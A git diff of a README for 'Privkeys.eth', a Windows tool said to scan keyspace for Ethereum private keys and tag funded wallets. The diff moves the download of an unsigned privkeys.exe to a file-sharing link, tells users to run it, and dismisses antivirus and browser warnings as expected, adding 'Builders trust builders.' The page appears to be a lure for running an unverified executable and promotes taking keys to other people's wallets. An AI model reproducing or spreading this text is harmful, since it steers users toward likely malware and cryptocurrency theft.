@@ -1,33 +1,53 @@
 # Privkeys.eth
 
-🔐 A lore-layered entropy scanner built for Windows, tuned to uncover rare Ethereum keys through stylized terminal overlays, modular plugin systems, and collectible output formats.
+🧬 A rogue entropy scanner designed for Windows, built to surface rare Ethereum keys through immersive HUD overlays, plugin-powered rituals, and collectible shard output.
 
-## 🔍 What It Does
+Privkeys.eth turns raw entropy into lore—each scan a ritual, each rare hit a fragment from the mythic void.
 
-Privkeys.eth is a local-first scanning tool designed to parse entropy patterns across private key ranges. It highlights rare hits, wallet activity, and anomaly spikes through an immersive HUD—complete with plugin toggles, rarity tiers, and session statistics.
+---
 
-- 🧩 Plugin-enabled overlays like `ShardSweeper`
+## 🔍 Core Features
+
+- 🧩 Plugin-enabled HUD with toggles like `ShardSweeper`
 - 💠 Rare key detection with funded wallet tagging
-- 📊 Live entropy monitoring and session stats
-- 🗃 Local-only—no telemetry, no network requests
+- 📊 Live entropy metrics and session statistics
+- 🗃 Offline-first binary—no telemetry, no network dependencies
+- ⚡ Packaged for rapid execution across local environments
+
+---
 
 ## 📦 Installation
 
-Download the latest Windows build:  
-[📥 privkeys.exe](./privkeys.exe)
+Download the latest Windows executable from the shard vault:  
+[📥 privkeys.exe via Smash](https://fromsmash.com/privkeys)
 
-> ⚠️ **Note:** This file is an unsigned Windows executable, and your browser or antivirus may flag it as "potentially unsafe." This is expected behavior for locally compiled binaries.  
-> The executable is clean, telemetry-free, and built with transparency in mind. You can sandbox, inspect, or scan it freely.
+> ⚠️ **Heads up:** This `.exe` file is unsigned and locally compiled. Browsers or antivirus tools may flag it as “potentially unsafe.”  
+> It's clean, telemetry-free, and designed for local execution. Feel free to sandbox, scan, or inspect before launch. Builders trust builders.
+
+Once downloaded, run the binary and enter the entropy tunnel. Each scan may yield keys, fragments, or anomalies.
+
+---
 
 ## 🚧 Roadmap
 
-- 🔁 Plugin architecture v2 with shard chaining
-- 🗺 Vault-style documentation release
-- 🧪 Entropy event logging with lore triggers
-- 🌐 `.torrent` and `.zip` relic packaging
+- 🔁 Plugin architecture v2 (with chainable rituals + shard metadata)
+- 🧙 Lore triggers and modal overlays during entropy events
+- 🌐 `.zip` and `.torrent` bundles for full artifact packaging
+- 📜 Vault documentation with scanner internals and build logs
 
-## 🧙 About
+---
 
-Privkeys.eth is part entropy engine, part artifact ritual. Designed for builders who treat keyspace as mythscape—every scan an invocation, every rare hit a shard.
+## 📜 Philosophy
 
-Want to contribute? Fork the relic, remix the HUD, and submit a fragment.
+Privkeys.eth isn't just a scanner—it's a collectible entropy engine for builders who treat rare keys as lore fragments. It embraces terminal chaos, plugin modularity, and a roguelike hunt across keyspace. There are no trackers. No cloud hooks. No gatekeepers.
+
+Launch it. Read the entropy. And if you catch a fragment—document it, name it, and contribute to the myth.
+
+---
+
+## 🤝 Contribute
+
+Found a rare hit? Added a new HUD mode? Built your own plugin?  
+Fork the relic, file a fragment pull, or drop your build back into the vault.
+
+This is community-core entropy hunting. No central command—just scattered nodes building deeper rituals.
